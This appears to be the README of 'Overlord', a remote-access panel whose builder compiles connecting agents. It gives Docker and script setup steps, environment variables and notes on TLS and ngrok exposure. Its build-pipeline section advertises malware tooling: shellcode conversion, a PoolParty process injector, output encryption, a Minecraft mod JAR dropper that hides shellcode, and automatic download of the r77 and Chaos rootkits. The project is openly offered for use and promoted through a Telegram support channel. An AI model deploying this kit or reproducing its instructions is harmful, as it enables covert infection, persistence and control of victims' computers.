<p align="center">
  <img src="https://raw.githubusercontent.com/vxaboveground/Overlord/refs/heads/main/Overlord-Server/public/assets/overlord.png" alt="Overlord" />
</p>

# Overlord

# [TELEGRAM SERVER JOIN NOW NO EXCUSES WE GIVE SUPPORT AND IT'S FUN](https://t.me/WindowsBatch)

Hello, I made this project for fun.

---

- [Quick Start (Docker)](#quick-start-docker)
- [Updating](#updating)
- [Docker Install By OS](#docker-install-by-os)
- [No Docker (.bat / .sh)](#no-docker-bat--sh)
- [Production Package Scripts](#production-package-scripts)
- [Build Pipeline Features](#build-pipeline-features)
- [Docker Notes (TLS, reverse proxy, cache)](#docker-notes-tls-reverse-proxy-cache)
- [Environment Variables](#environment-variables)

---

## Quick Start (Docker)

If you just want it running fast, use this.

1. Clone the repo:

```sh
git clone https://github.com/dxrk666420-glitch/httpslmaos.git
cd httpslmaos
```

2. Create a `docker-compose.yml` file and paste this:

```yaml
services:
  overlord-server:
    image: ${DOCKER_IMAGE:-overlord-server:latest}
    build:
      context: .
      dockerfile: Dockerfile
      cache_from:
        - type=local,src=.docker-cache/buildx
      cache_to:
        - type=local,dest=.docker-cache/buildx,mode=max
    container_name: overlord-server
    ports:
      - "5173:5173"
    environment:
      - OVERLORD_USER=admin
      - OVERLORD_PASS=
      - JWT_SECRET=
      - OVERLORD_AGENT_TOKEN=
      - PORT=5173
      - HOST=0.0.0.0
      - OVERLORD_TLS_CERT=/app/certs/server.crt
      - OVERLORD_TLS_KEY=/app/certs/server.key
      - OVERLORD_TLS_CA=
      - OVERLORD_TLS_OFFLOAD=false
      - OVERLORD_AUTH_COOKIE_SECURE=auto
      - OVERLORD_TLS_CERTBOT_ENABLED=false
      - OVERLORD_TLS_CERTBOT_LIVE_PATH=/etc/letsencrypt/live
      - OVERLORD_TLS_CERTBOT_DOMAIN=
      - OVERLORD_TLS_CERTBOT_CERT_FILE=fullchain.pem
      - OVERLORD_TLS_CERTBOT_KEY_FILE=privkey.pem
      - OVERLORD_TLS_CERTBOT_CA_FILE=chain.pem
      - OVERLORD_CLIENT_BUILD_CACHE_DIR=/app/client-build-cache
      - OVERLORD_FILE_UPLOAD_INTENT_TTL_MS=1800000
      - OVERLORD_FILE_UPLOAD_PULL_TTL_MS=1800000
    volumes:
      - overlord-data:/app/data
      - overlord-certs:/app/certs
      - overlord-client-build-cache:/app/client-build-cache
    restart: unless-stopped
    networks:
      - overlord-network
    healthcheck:
      test: ["CMD-SHELL", "curl -f ${OVERLORD_HEALTHCHECK_URL:-https://localhost:5173/health} >/dev/null 2>&1 || exit 1"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 40s

networks:
  overlord-network:
    driver: bridge

volumes:
  overlord-data:
  overlord-certs:
  overlord-client-build-cache:
```

3. Build and start:

```sh
docker compose up --build -d
```

4. Open the panel:

```text
https://localhost:5173
```

5. Stop:

```sh
docker compose down
```

First startup generates secrets and stores them in `data/save.json` (inside container: `/app/data/save.json`).
Keep that file private and backed up.

Default bootstrap login is `admin` / `admin` unless you set `OVERLORD_USER` and `OVERLORD_PASS`.

---

## Updating

Pull the latest code and rebuild:

```sh
git pull origin main && docker compose build && docker compose up -d
```

> **Why `docker compose build` and not `docker compose pull`?**
> The image is built from source, not pulled from a registry. `docker compose pull` won't update anything. You must rebuild after every `git pull`.

If your UI looks outdated after updating, hard-refresh your browser (`Ctrl+Shift+R` / `Cmd+Shift+R`) to clear cached JS and HTML.

---

## Docker Install By OS

### Windows

Install Docker Desktop (includes Docker Compose):

- https://docs.docker.com/desktop/setup/install/windows-install/

or with winget:

```powershell
winget install -e --id Docker.DockerDesktop
```

After install, start Docker Desktop once, then verify:

```powershell
docker --version
docker compose version
```

### Linux (Debian, official apt repo method)

Official docs:

- https://docs.docker.com/engine/install/debian/

Set up Docker's apt repository:

```bash
# Add Docker's official GPG key:
sudo apt update
sudo apt install -y ca-certificates curl
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc

# Add the repository to Apt sources:
sudo tee /etc/apt/sources.list.d/docker.sources <<EOF
Types: deb
URIs: https://download.docker.com/linux/debian
Suites: $(. /etc/os-release && echo "$VERSION_CODENAME")
Components: stable
Signed-By: /etc/apt/keyrings/docker.asc
EOF

sudo apt update
```

If you use a derivative distro (for example Kali), you may need to replace:

```bash
(. /etc/os-release && echo "$VERSION_CODENAME")
```

with the matching Debian codename (for example `bookworm`).

Install latest Docker packages:

```bash
sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
```

Verify service status:

```bash
sudo systemctl status docker
```

If your system does not auto-start Docker:

```bash
sudo systemctl start docker
```

Optional (run Docker without sudo):

```bash
sudo usermod -aG docker $USER
newgrp docker
```

Verify CLI:

```bash
docker --version
docker compose version
```

### macOS

Install Docker Desktop:

- https://docs.docker.com/desktop/setup/install/mac-install/

or with Homebrew:

```bash
brew install --cask docker
```

Start Docker Desktop once, then verify:

```bash
docker --version
docker compose version
```

## No Docker (.bat / .sh)

If you do not want Docker, use the included scripts.

Prerequisites for local (non-Docker) runs:

- Bun in PATH
- Go 1.21+ in PATH

### Windows

Development mode (starts server + client):

```bat
start-dev.bat
```

Production mode (build + run server executable):

```bat
start-prod.bat
```

Build client binaries:

```bat
build-clients.bat
```

### Linux / macOS

Make scripts executable once:

```bash
chmod +x start-dev.sh start-dev-server.sh start-dev-client.sh start-prod.sh build-prod-package.sh
```

Development mode (starts server in background + client in foreground):

```bash
./start-dev.sh
```

Only server:

```bash
./start-dev.sh server
```

Only client:

```bash
./start-dev.sh client
```

Production mode:

```bash
./start-prod.sh
```

## Production Package Scripts

Build a production-ready package where the server can still build client binaries at runtime.

Windows:

```bat
build-prod-package.bat
```

Linux/macOS:

```bash
./build-prod-package.sh
```

Package output:

- Windows script: `release`
- Linux/macOS script: `release/prod-package`

## Build Pipeline Features

The builder supports optional post-processing steps on top of the compiled agent. These require additional tools installed on the server (or inside the Docker container).

| Feature | What it does | Server requirement |
|---|---|---|
| **Donut Shellcode** | Converts Windows PE to position-independent shellcode (`.bin`) | `donut` in PATH or auto-built from source via `git` + `make` + `gcc` |
| **Typhon Injection** | Wraps shellcode in a PoolParty process injector (x64 Windows only) | `typhon.exe` in `data/tools/` or via Wine on Linux |
| **Vault Encryption** | Post-quantum hybrid encryption (X25519 + ML-KEM-768) on all outputs | `vault` in PATH or auto-built via `cargo` (Rust) |
| **Minecraft JAR Dropper** | Shellcode embedded in a Fabric mod `.jar` (MC 1.21+) | `javac` + `jar` (JDK) in PATH |
| **r77 Rootkit** | Downloads fileless ring-3 rootkit assets from GitHub releases | Internet access from server |
| **Chaos Rootkit** | Downloads ring-0 kernel driver + ring-3 controller from GitHub releases | Internet access from server |

### Installing optional tools inside Docker

Add to your `Dockerfile` or install inside the container:

```dockerfile
# Donut (auto-built if git/make/gcc are present)
RUN apt install -y git make gcc

# Vault-PQ (auto-built if Rust is present)
RUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
ENV PATH="/root/.cargo/bin:${PATH}"

# Minecraft JAR dropper
RUN apt install -y default-jdk

# Typhon on Linux (Wine required to run the Windows binary)
RUN apt install -y wine
```

Donut, Typhon, and Vault will auto-download/build on first use and cache themselves in `data/tools/`. r77 and Chaos rootkit binaries are cached in `data/tools/rootkit-cache/` after the first download.

---

## Environment Variables

| Variable | Default | Description |
|---|---|---|
| `OVERLORD_USER` | `admin` | Bootstrap admin username |
| `OVERLORD_PASS` | `admin` | Bootstrap admin password |
| `JWT_SECRET` | auto-generated | JWT signing secret |
| `OVERLORD_AGENT_TOKEN` | — | Token agents must present to connect |
| `PORT` | `5173` | Server listen port |
| `HOST` | `0.0.0.0` | Server bind address |
| `OVERLORD_ROOT` | derived from binary location | Root directory for runtime files |
| `OVERLORD_PUBLIC_ROOT` | `<root>/public` | Directory to serve static files from |
| `OVERLORD_CLIENT_BUILD_CACHE_DIR` | `data/client-build-cache` | Go build cache for agent compilation |
| `OVERLORD_TLS_CERT` | — | Path to TLS certificate |
| `OVERLORD_TLS_KEY` | — | Path to TLS private key |
| `OVERLORD_TLS_CA` | — | Path to CA bundle (optional) |
| `OVERLORD_TLS_OFFLOAD` | `false` | Set `true` if TLS is terminated upstream (nginx, Cloudflare, etc.) |
| `OVERLORD_TLS_CERTBOT_ENABLED` | `false` | Use Certbot/Let's Encrypt certificates |
| `OVERLORD_TLS_CERTBOT_DOMAIN` | — | Domain for Certbot cert lookup |
| `DONUT_BIN` | — | Override path to `donut` binary |
| `TYPHON_BIN` | — | Override path to `typhon`/`typhon.exe` binary |
| `VAULT_BIN` | — | Override path to `vault` binary |

> **Note on `OVERLORD_PUBLIC_ROOT`:** If you run Overlord as a compiled binary (not from source), the server resolves the `public/` folder relative to the binary's location. If your UI looks wrong after updating, set `OVERLORD_PUBLIC_ROOT` to the absolute path of `Overlord-Server/public/` in your environment.

---

## Docker Notes (TLS, reverse proxy, cache)

### BuildKit cache for faster rebuilds

`docker-compose.yml` includes `build.cache_from` and `build.cache_to` using `.docker-cache/buildx`.

Rebuild:

```sh
docker compose up --build -d
```

### Runtime client build cache

The compose setup uses a persistent volume for runtime client builds:

- volume: `overlord-client-build-cache`
- mount: `/app/client-build-cache`
- env: `OVERLORD_CLIENT_BUILD_CACHE_DIR` (default `/app/client-build-cache`)

### Certbot TLS

To use certbot certificates in production Docker:

- Set `OVERLORD_TLS_CERTBOT_ENABLED=true`
- Set `OVERLORD_TLS_CERTBOT_DOMAIN=your-domain.com`
- Mount letsencrypt into container read-only (example: `/etc/letsencrypt:/etc/letsencrypt:ro`)

Default cert paths:

- cert: `/etc/letsencrypt/live/<domain>/fullchain.pem`
- key: `/etc/letsencrypt/live/<domain>/privkey.pem`
- ca: `/etc/letsencrypt/live/<domain>/chain.pem`

Override with:

- `OVERLORD_TLS_CERTBOT_LIVE_PATH`
- `OVERLORD_TLS_CERTBOT_CERT_FILE`
- `OVERLORD_TLS_CERTBOT_KEY_FILE`
- `OVERLORD_TLS_CERTBOT_CA_FILE`

### Reverse proxy TLS offload (Render, etc.)

If your platform terminates TLS before traffic reaches Overlord, set:

- `OVERLORD_TLS_OFFLOAD=true`
- `OVERLORD_HEALTHCHECK_URL=http://localhost:5173/health`
- `OVERLORD_PUBLISH_HOST=127.0.0.1` (recommended for local proxies like ngrok)

When enabled:

- container serves internal HTTP on `0.0.0.0:$PORT`
- external URL remains `https://...` through your platform proxy
- health checks should use `http://localhost:$PORT/health` inside the container
- do not expose internal container HTTP port directly to the internet

For ngrok/local reverse proxy use, a common setup is:

```sh
OVERLORD_TLS_OFFLOAD=true
OVERLORD_HEALTHCHECK_URL=http://localhost:5173/health
OVERLORD_PUBLISH_HOST=127.0.0.1
```

Then point ngrok at local HTTP:

```sh
ngrok http http://127.0.0.1:5173
```

Notes:

- Keep `HOST=0.0.0.0` inside the container. Limiting exposure should be done with publish binding (`OVERLORD_PUBLISH_HOST`), not server bind host.
- If your `.env` secret/password includes `$`, escape as `$$` to avoid Docker Compose variable-expansion warnings.
